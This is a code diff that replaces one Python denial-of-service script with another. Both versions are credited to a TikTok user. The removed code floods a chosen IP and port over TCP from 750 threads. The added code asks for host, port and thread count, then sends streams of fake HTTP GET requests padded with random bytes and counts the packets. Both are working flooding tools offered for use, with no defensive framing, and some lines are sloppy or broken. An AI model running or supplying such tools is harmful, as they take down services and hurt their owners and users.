@@ -1,40 +1,80 @@
 import socket
-import threading
 import time
-import random
-import string
 import os
+import random
+from threading import Thread
 
-TARGET_IP = input("TARGET IP: ")
-TARGET_PORT = int(input("OPEN PORT: "))
-NUM_THREADS = 750
 os.system("clear")
-print(f"🚀 TCP flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.\n(MADE BY apexvr_ ON TIKTOK)")
 
-def random_payload(size=32768):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
+if not __name__ == "__main__":
+    exit()
+      
+def getport():
+    try:
+        TARGET_PORT = int(input("Port:\r\n"))
+        return TARGET_PORT
+    except ValueError:
+        print("Port must be a number, Port was set to default " + "80")
+        return 80
 
-def tcp_flood():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((TARGET_IP, TARGET_PORT))
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            while True:
-                s.sendall(random_payload(32768))
-        except Exception:
-            s.close()
-            time.sleep(0.01)
-threads = []
-for i in range(NUM_THREADS):
-    t = threading.Thread(target=tcp_flood, name=f"Wątek-{i+1}", daemon=True)
-    t.start()
-    threads.append(t)
+host = input("Host:\r\n")
+port = getport()
+speedPerRun = int(input("Hits Per Run:\r\n"))
+threads = int(input("Threads:\r\n"))
 
+ip = socket.gethostbyname(host)
 
+bytesToSend = random._urandom(2450)
+
+print("MADE BY apexvr_ ON TIKTOK")
+
+i = 0;
+
+class Count:
+    packetCounter = 0 
+
+def DoS():
+    try:
+        while True:
+            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                dosSocket.connect((ip, port))
+                for i in range(speedPerRun):
+                    try:
+                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
+                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
+                        print("---🚀 PACKET " + str(" SENT AT: " + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()), "🚀---")
+                        Count.packetCounter = Count.packetCounter + 1
+                    except socket.error:
+                        print("[!] Error, Maybe host is down.")
+                    except KeyboardInterrupt:
+                        print("\r\n[!] Ended (Keyboard interupt)")
+            except socket.error:
+                print("[!] Error, Maybe the host is down.")
+            except KeyboardInterrupt:
+                print("\r\n[!] Ended (Keyboard interupt)")
+            dosSocket.close()
+    except KeyboardInterrupt:
+        print("\r\n[!] Ended (Keyboard interupt)")
 try:
-    while True:
-        time.sleep(1)
+        
+    print("Loading.")
+    time.sleep(1)
+    print("Loading..")
+    time.sleep(1)
+    print("Loading...")
+    time.sleep(1)
+    print("Loading.")
+    time.sleep(1)
+    print("Loading..")
+    time.sleep(1)
+    print("Loading...")
+    
+    for i in range(threads):
+        try:
+            t = Thread(target=DoS)
+            t.start()
+        except KeyboardInterrupt:
+            print("\r\n[!] Ended (Keyboard interupt)")    
 except KeyboardInterrupt:
-    print("\n✅ Flood ended(Ctrl+C)")
+    print("\r\n[!] Ended (Keyboard interupt)")
